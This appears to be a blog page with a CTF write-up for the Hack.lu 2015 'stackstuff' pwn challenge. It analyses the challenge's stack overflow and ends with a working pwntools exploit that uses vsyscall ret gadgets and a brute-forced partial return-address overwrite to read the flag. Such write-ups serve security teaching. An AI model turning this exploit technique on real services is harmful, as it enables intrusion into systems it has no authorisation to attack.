@@ -1,0 +1,338 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>nightmare 7.1.1.Hacklu2015-stackstuff-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="相关资源  
+文件分析123456$ checksec stackstuff     Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="nightmare 7.1.1.Hacklu2015-stackstuff-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												nightmare 7.1.1.Hacklu2015-stackstuff-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/09/03/Hacklu2015-stackstuff-wp/" class="leancloud-visitors view"
+										data-flag-title="nightmare 7.1.1.Hacklu2015-stackstuff-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/15-partial_overwrite/hacklu15_stackstuff">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec stackstuff </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><code>14#</code>设定在端口1514监听，<code>24#accept</code>接收到socket之后fork出子进程，执行<code>37#execl</code>，即执行到<code>4#handle_request</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">   <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(*argv, <span class="string">&quot;reexec&quot;</span>)) &#123;</span><br><span class="line">        handle_request();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v4 = socket(<span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        fd = negchke(v4, <span class="string">&quot;unable to create socket&quot;</span>);</span><br><span class="line">        *(_QWORD *)&amp;addr.sa_family = <span class="number">10LL</span>;</span><br><span class="line">        *(_QWORD *)&amp;addr.sa_data[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">        v15 = <span class="number">0LL</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        *(_WORD *)addr.sa_data = htons(<span class="number">1514u</span>);</span><br><span class="line">        optval = <span class="number">1</span>;</span><br><span class="line">        v5 = setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>);</span><br><span class="line">        negchke(v5, <span class="string">&quot;unable to set SO_REUSEADDR&quot;</span>);</span><br><span class="line">        v6 = bind(fd, &amp;addr, <span class="number">0x1C</span>u);</span><br><span class="line">        negchke(v6, <span class="string">&quot;unable to bind&quot;</span>);</span><br><span class="line">        v7 = listen(fd, <span class="number">16</span>);</span><br><span class="line">        negchke(v7, <span class="string">&quot;unable to listen&quot;</span>);</span><br><span class="line">        signal(<span class="number">17</span>, (<span class="type">__sighandler_t</span>)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            v8 = accept(fd, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">            v18 = negchke(v8, <span class="string">&quot;unable to accept&quot;</span>);</span><br><span class="line">            v9 = fork();</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="type">unsigned</span> <span class="type">int</span>)negchke(v9, <span class="string">&quot;unable to fork&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            close(v18);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        v10 = dup2(v18, <span class="number">0</span>);</span><br><span class="line">        negchke(v10, <span class="string">&quot;unable to dup2&quot;</span>);</span><br><span class="line">        v11 = dup2(v18, <span class="number">1</span>);</span><br><span class="line">        negchke(v11, <span class="string">&quot;unable to dup2&quot;</span>);</span><br><span class="line">        close(v18);</span><br><span class="line">        v12 = execl(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;reexec&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">        negchke(v12, <span class="string">&quot;unable to reexec&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="handle-request"><a href="#handle-request" class="headerlink" title="handle_request"></a>handle_request</h3><p>读取密码，<code>15#require_auth</code>进行验证，验证通过输出flag</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> v1[<span class="number">64</span>];  <span class="comment">// [rsp+0h] [rbp-58h] BYREF</span></span><br><span class="line">    FILE *v2;     <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">    stream = fopen(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!stream || !fgets(real_password, <span class="number">50</span>, stream)) &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;unable to read real_password\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x1D</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hi! This is the flag download service.&quot;</span>);</span><br><span class="line">    require_auth();</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!v2 || !fgets(v1, <span class="number">50</span>, v2)) &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;unable to read flag\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="require-auth-gt-check-password-correct"><a href="#require-auth-gt-check-password-correct" class="headerlink" title="require_auth  -&gt; check_password_correct"></a>require_auth  -&gt; check_password_correct</h3><p>读取长度，超过50则置为90，明显栈溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">check_password_correct</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> v0;    <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v2;       <span class="comment">// [rsp+Ch] [rbp-4Ch] BYREF</span></span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">50</span>]; <span class="comment">// [rsp+10h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ptr));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To download the flag, you need to specify a password.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Length of password: &quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d\n&quot;</span>, &amp;v2) != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">50</span>)</span><br><span class="line">        v2 = <span class="number">90</span>;</span><br><span class="line">    v0 = fread(ptr, <span class="number">1uLL</span>, v2, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (v0 != v2)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(ptr, real_password) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="子进程中check-password-correct调试方法"><a href="#子进程中check-password-correct调试方法" class="headerlink" title="子进程中check_password_correct调试方法"></a>子进程中check_password_correct调试方法</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># terminal 1</span></span><br><span class="line">$ gdb stackstuff</span><br><span class="line">gef➤  <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">gef➤  b check_password_correct</span><br><span class="line">gef➤  r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在另一个terminal 2</span></span><br><span class="line">$ nc 127.0.0.1 1514</span><br><span class="line"></span><br><span class="line"><span class="comment"># terminal 1 中即可看到运行到check_password_correct</span></span><br></pre></td></tr></table></figure>
+
+<p>程序虽然存在栈溢出，但是开了PIE也没有泄露的地方  首先想着能不能直接覆盖返回地址的低位字节控制跳转</p>
+<p>gdb调试进入到<code>check_password_correct</code>，获取输入到ret_addr的偏移量为<code>0x7fffffffe398 - 0x007fffffffe350 = 0x48</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x555555400f7e → check_password_correct()</span><br><span class="line">[#1] 0x555555400fd1 → require_auth()</span><br><span class="line">[#2] 0x55555540108b → handle_request()</span><br><span class="line">[#3] 0x55555540112d → main()</span><br><span class="line"></span><br><span class="line">gef➤  info f</span><br><span class="line">Stack level 0, frame at 0x7fffffffe3a0:</span><br><span class="line"> rip = 0x555555400f7e in check_password_correct; saved rip = 0x555555400fd1</span><br><span class="line"> called by frame at 0x7fffffffe3b0</span><br><span class="line"> Arglist at 0x7fffffffe338, args: </span><br><span class="line"> Locals at 0x7fffffffe338, Previous frame&#x27;s sp is 0x7fffffffe3a0</span><br><span class="line"> Saved registers:</span><br><span class="line">  rip at 0x7fffffffe398	# ret addr</span><br><span class="line"></span><br><span class="line">gef➤  stack 15</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x007fffffffe340│+0x0000: 0x007ffff7f98760  →  0x00000000fbad2887	 ← $rsp</span><br><span class="line">0x007fffffffe348│+0x0008: 0x0000005af7e47283</span><br><span class="line">0x007fffffffe350│+0x0010: &quot;afdsfasdfasdf\ngasfdasffffffffffffffffffffffffffff[...]&quot;</span><br><span class="line">0x007fffffffe358│+0x0018: &quot;fasdf\ngasfdasffffffffffffffffffffffffffffffffffff[...]&quot;</span><br><span class="line">0x007fffffffe360│+0x0020: &quot;sfdasfffffffffffffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe368│+0x0028: &quot;ffffffffffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe370│+0x0030: &quot;ffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe378│+0x0038: &quot;ffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe380│+0x0040: &quot;ffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe388│+0x0048: &quot;ffffffff\n&quot;</span><br><span class="line">0x007fffffffe390│+0x0050: 0x0000000000000a (&quot;\n&quot;?)</span><br><span class="line">0x007fffffffe398│+0x0058: 0x00555555400fd1  →  &lt;require_auth+23&gt; test eax, eax</span><br><span class="line">0x007fffffffe3a0│+0x0060: 0x0000000000000000</span><br><span class="line">0x007fffffffe3a8│+0x0068: 0x0055555540108b  →  &lt;handle_request+177&gt; lea rsi, [rip+0x36d]        # 0x5555554013ff</span><br><span class="line">0x007fffffffe3b0│+0x0070: 0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>但是read长度为<code>90 == 0x5a</code>，所以还要往下写0x12个字节，那么整个返回地址都会被覆盖掉，这个方法也就不行了</p>
+<p>但是发现能刚刚好覆盖<code>0x0x007fffffffe3a8</code>处上层栈帧的返回地址的最低两个字节，即<code>require_auth</code>成功执行结束后开始读取flag的地址，明显也就是我们想要的跳转地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000106D loc_106D:</span><br><span class="line">.text:000000000000106D mov     rax, [rsp+58h+stream]</span><br><span class="line">.text:0000000000001072 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001075 call    _fclose</span><br><span class="line">.text:000000000000107A lea     rdi, aHiThisIsTheFla ; &quot;Hi! This is the flag download service.&quot;</span><br><span class="line">.text:0000000000001081 call    _puts</span><br><span class="line">.text:0000000000001086 call    require_auth</span><br><span class="line">.text:000000000000108B lea     rsi, modes      ; &quot;r&quot;</span><br><span class="line">.text:0000000000001092 lea     rdi, aFlag      ; &quot;flag&quot;</span><br><span class="line">.text:0000000000001099 call    _fopen</span><br></pre></td></tr></table></figure>
+
+<p>现在目标就是在栈上写两个<code>ret</code>指令的地址并覆盖<code>0x0x007fffffffe3a8</code>处最低两个字节保持地址值不变即可</p>
+<h3 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h3><p>即使开了PIE随机化，还有一个<code>vsyscall</code>段，它的地址是固定的，其中有ret指令可以满足我们的要求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff</span><br><span class="line">0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff</span><br><span class="line">0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]		# here  （环境为ubuntu22.08）</span><br><span class="line">gef➤  x/4i 0xffffffffff600800</span><br><span class="line">   0xffffffffff600800:    mov    rax,0x135</span><br><span class="line">   0xffffffffff600807:    syscall</span><br><span class="line">   0xffffffffff600809:    ret    </span><br><span class="line">   0xffffffffff60080a:    int3</span><br></pre></td></tr></table></figure>
+
+<p>注意不论怎么随机化最低12bit的<code>08b</code>是不变的（页对齐），因此需要爆破倒数第二个字节，但最多也只需爆破16次，即从<code>0x008b,0x108b...0xf08b</code></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdbyte = <span class="number">0x00</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1514</span>)</span><br><span class="line">    client.sendlineafter(<span class="string">b&#x27;Length&#x27;</span>, <span class="string">b&#x27;60&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x48</span> + p64(<span class="number">0xffffffffff600800</span>) * <span class="number">2</span>		<span class="comment"># padding 加上两次ret</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x8b&#x27;</span> + p8(rdbyte)		<span class="comment"># 覆盖倒数两个字节</span></span><br><span class="line">    rdbyte += <span class="number">0x10</span>	<span class="comment"># 爆破</span></span><br><span class="line">    client.sendline(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> client.recvall():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"><span class="comment"># flag&#123;g0ttem_b0yz&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/09/03/Hacklu2015-stackstuff-wp/" class="leancloud-visitors view" data-flag-title="nightmare 7.1.1.Hacklu2015-stackstuff-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/09/02/DASCTF2023-Serpent-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-09-03 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn-wp/">pwn-wp<span>14</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>64</span></a></li> <li><a href="/tags/pwn/">pwn<span>19</span></a></li> <li><a href="/tags/stack/">stack<span>9</span></a></li> <li><a href="/tags/nightmare/">nightmare<span>8</span></a></li> <li><a href="/tags/overwrite/">overwrite<span>1</span></a></li> <li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
